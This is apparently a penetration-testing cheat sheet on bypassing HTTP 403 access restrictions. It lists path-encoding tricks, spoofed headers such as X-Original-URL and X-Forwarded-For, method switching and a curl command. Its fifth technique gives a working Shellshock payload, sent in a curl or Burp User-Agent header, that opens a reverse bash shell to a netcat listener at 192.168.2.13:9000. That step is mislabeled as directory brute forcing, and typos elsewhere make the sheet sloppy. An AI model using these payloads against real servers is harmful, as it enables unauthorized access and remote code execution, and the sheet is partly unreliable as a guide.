**How to bypass 403 Errors**

**Technique number 1**
- Appending `{%2e} or {%2f} { **/*, /./}` after the first slash
	- https://www.domain/DB = 403  
	- https://www.domain/%2e/DB] =200  
	- https://www.domain/./DB] =200 

**Technique number 2**
- Adding headers to requests module.
	- Content-Length: 0  
	- X-rewrite-url  
	- X-Original-URL  
	- X-Custom-IP-Authorization  
	- X-Forwarded-For

**Technique number 3**
- Change the request method
	- GET → POST
	- GET → TRACE
	- GET → PUT
	- GET **→** OPTIONS 

**Technique number 4**
- Using Curl
	- curl -i -s -k -X $’GET’ -H $’Host: account.domain.com’ -H $’X-rewrite-url: admin/login’ $’https://account.domain.com/' 

**Technique number 5**
- Brute force sub directory from the 403 directory
   - Try using (wordlist/dirb/comon.txt)
   - Setup Netcat lisener
   - Inject parameters from Curl or Burp Suite
   - CURL ---> curl -A “() { :; }; /bin/bash -i > /dev/tcp/192.168.2.13/9000 0<&1 2>&1” http://192.168.2.18/cgi-bin/helloworld.cgi
   - Burp Suite ---> Change User-Agent: () { :; }; /bin/bash -i > /dev/tcp/192.168.2.13/9000 0<&1 2>&1
   - More info ---> https://hackbotone.com/shellshock-attack-on-a-remote-web-server-d9124f4a0af3


**Technique number 6**
- Kali linux tool ---> 403 bypass